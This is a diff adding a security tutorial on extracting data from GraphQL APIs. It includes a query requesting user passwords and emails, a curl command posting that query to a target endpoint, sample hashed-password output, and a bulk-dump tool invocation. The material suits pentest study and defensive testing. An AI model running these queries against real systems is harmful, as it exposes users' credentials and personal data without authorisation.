@@ -1,0 +1,100 @@
+---
+title: Extract Data via GraphQL Injection Techniques
+description: Learn methods to extract data using GraphQL injection, including manual
+  and automated approaches for effective data retrieval.
+keywords:
+- GraphQL Injection
+- data extraction
+- bulk data retrieval
+- sensitive data exposure
+- query manipulation
+- automated data scraping
+- injection vulnerability
+- GraphQL queries
+---
+
+# Extract Data
+
+## Context
+
+In this article, we will explore how to extract sensitive or bulk data from a GraphQL endpoint through injection techniques. This guide assumes you have a working knowledge of GraphQL schema, GraphQL queries, HTTP requests, and are familiar with GraphQL Injection techniques.
+
+## Theory
+
+### GraphQL Query Structure for Data Extraction
+
+GraphQL queries are designed to specify precisely which fields and objects should be fetched from the backend. Attackers can exploit these queries to enumerate and extract sensitive data if the input received by the GraphQL API is unsanitized. Injection points within the queries allow for arbitrary query manipulation, enabling unauthorized data access and extraction.
+
+### Sensitive Data Exposure via GraphQL Injection
+
+When exploiting GraphQL injection for sensitive data exposure, the process typically involves identifying an injectable parameter, injecting a crafted query, and receiving sensitive data in the response. A notable risk here is the lack of field-level access controls, which increases the chance for mass data exposure.
+
+### Bulk Data Retrieval Techniques
+
+Bulk data extraction generally involves querying substantial datasets or multiple objects with a single request. Attackers can leverage wildcards or enumerate fields to maximize the amount of data returned in one query. By exploiting these techniques, extensive data can be extracted efficiently.
+
+## Practice
+
+### Manual Extraction of Data via GraphQL Injection
+
+- **Identify a vulnerable parameter:**
+  Look for user-controllable fields in the GraphQL query or its variables that could be vulnerable to injection.
+
+- **Craft a query to extract sensitive fields:**
+  ```graphql
+  {
+      users {
+          id
+          username
+          email
+          password
+      }
+  }
+  ```
+
+- **Send the query to the GraphQL endpoint:**
+  Use a command to inject this query into a potentially vulnerable point.
+  ```bash
+  curl -X POST https://target/graphql \
+      -H 'Content-Type: application/json' \
+      --data '{"query": "{ users { id username email password } }"}'
+  ```
+
+- **Observe the response:**
+  Analyze the output for extracted sensitive data.
+  ```json
+  {
+      "data": {
+          "users": [
+              {
+                  "id": "1",
+                  "username": "admin",
+                  "email": "admin@example.com",
+                  "password": "$2y$10$..."
+              }
+          ]
+      }
+  }
+  ```
+
+### Automated Data Dump Using GraphQL Enumeration Tools
+
+- **Use a tool for automated extraction:**
+  Leverage a tool that automates query crafting and parsing of responses to enumerate and extract all accessible data via injection. 
+
+- **Run an enumeration tool:**
+  Execute GraphQL Cop or similar tool to dump all accessible data. Replace `https://target/graphql` with your target endpoint.
+  ```bash
+  python3 graphql-cop.py -u https://target/graphql --dump-all
+  ```
+
+- **Review the output:**
+  The tool should output bulk data retrieved from the endpoint.
+  ```text
+  [*] Dumped 1000 user records from 'users' object.
+  ```
+
+## Tools
+
+- **graphql-cop**
+- **curl** 
